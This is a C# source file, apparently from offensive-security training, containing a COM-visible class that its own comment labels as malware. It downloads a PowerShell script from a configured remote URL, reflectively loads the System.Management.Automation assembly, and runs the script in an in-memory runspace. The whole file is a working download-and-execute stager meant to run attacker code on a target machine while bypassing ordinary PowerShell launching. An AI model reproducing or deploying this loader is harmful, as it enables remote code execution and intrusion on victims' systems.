using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace OSEP
{
    [ComVisible(true)]
    public class OSEPRunner
    {

        public static void OSEPExec()
        {
            //Malware here.
            Debug.RunDebug("DLL Artifact PS Runspace Reflection Dynamic OSEPExec() has started...");


            Debug.RunDebug("Downloading script...");
            byte[] fileBytes = DownloadFileAsync($"{CONFIG.HTTP_URL}/{CONFIG.PS_DYNAMIC_SCRIPT_NAME}").GetAwaiter().GetResult();


            string script = Encoding.UTF8.GetString(fileBytes);





            Debug.RunDebug("Locating System Management Automation...");
            string windir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            string[] locations = {
                Path.Combine(windir, @"System32\WindowsPowerShell\v1.0\System.Management.Automation.dll"),
                Path.Combine(windir, @"SysWOW64\WindowsPowerShell\v1.0\System.Management.Automation.dll"),
                @"C:\Program Files\PowerShell\7\System.Management.Automation.dll",
                @"C:\Program Files\PowerShell\7-preview\System.Management.Automation.dll"
            };
            string dllPath = locations.FirstOrDefault(File.Exists);



            Debug.RunDebug("Loading System Management Automation...");
            Assembly sma;
            if (dllPath != null)
            {
                sma = Assembly.LoadFrom(dllPath);
            }
            else
            {
                sma = Assembly.Load(
                "System.Management.Automation, " +
                "Version=3.0.0.0, " +
                "Culture=neutral, " +
                "PublicKeyToken=31bf3856ad364e35");
            }

            if (sma == null)
            {
                Debug.RunDebug("System Management Automation not found. Aborting...");
                Environment.Exit(0);
            }


            Debug.RunDebug("Creating runsapce (Reflective)...");
            Type runspaceFactoryType = sma.GetType("System.Management.Automation.Runspaces.RunspaceFactory", throwOnError: true);
            Type powerShellType = sma.GetType("System.Management.Automation.PowerShell", throwOnError: true);
            object runspace = runspaceFactoryType.GetMethod("CreateRunspace", Type.EmptyTypes).Invoke(null, null);
            object powerShell = powerShellType.GetMethod("Create", Type.EmptyTypes).Invoke(null, null);
            runspace.GetType().GetMethod("Open", Type.EmptyTypes).Invoke(runspace, null);
            powerShellType.GetProperty("Runspace").SetValue(powerShell, runspace, null);


            Debug.RunDebug("Invoking script...");
            powerShellType.GetMethod("AddScript", new[] { typeof(string) }).Invoke(powerShell, new object[] { script });

            MethodInfo invokeMethod = powerShellType
        .GetMethods(BindingFlags.Public | BindingFlags.Instance)
        .Single(method =>
            method.Name == "Invoke" &&
            !method.IsGenericMethod &&
            method.GetParameters().Length == 0);

            invokeMethod.Invoke(powerShell, null);



            (powerShell as IDisposable)?.Dispose();
            (runspace as IDisposable)?.Dispose();
            Debug.RunDebug("Done...");
        }

        public static async Task<byte[]> DownloadFileAsync(string url)
        {
            using (var client = new HttpClient())
            {
                return await client.GetByteArrayAsync(url);
            }
        }

    }
}